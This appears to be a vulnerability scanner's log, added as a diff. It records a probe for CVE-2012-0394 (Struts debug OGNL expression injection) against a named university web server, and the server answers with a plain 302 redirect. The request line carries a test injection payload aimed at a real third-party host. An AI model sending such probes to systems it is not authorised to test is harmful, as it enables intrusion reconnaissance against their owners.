@@ -1,0 +1,32 @@
+[CVE-2012-0394] Dumped HTTP request for http://web.mup.unimelb.edu.au/portal/displayAPSForm.action?debug=command&expression=1666*2769
+
+
+GET /portal/displayAPSForm.action?debug=command&expression=1666*2769 HTTP/1.1
+Host: web.mup.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2012-0394] Dumped HTTP response http://web.mup.unimelb.edu.au/portal/displayAPSForm.action?debug=command&expression=1666*2769
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 369
+Content-Type: text/html; charset=iso-8859-1
+Date: Wed, 06 Aug 2025 15:18:46 GMT
+Location: https://web.mup.unimelb.edu.au/portal/displayAPSForm.action?debug=command&expression=1666*2769
+Server: Apache/2.4.7 (Ubuntu)
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>302 Found</title>
+</head><body>
+<h1>Found</h1>
+<p>The document has moved <a href="https://web.mup.unimelb.edu.au/portal/displayAPSForm.action?debug=command&amp;expression=1666*2769">here</a>.</p>
+<hr>
+<address>Apache/2.4.7 (Ubuntu) Server at web.mup.unimelb.edu.au Port 80</address>
+</body></html>
+
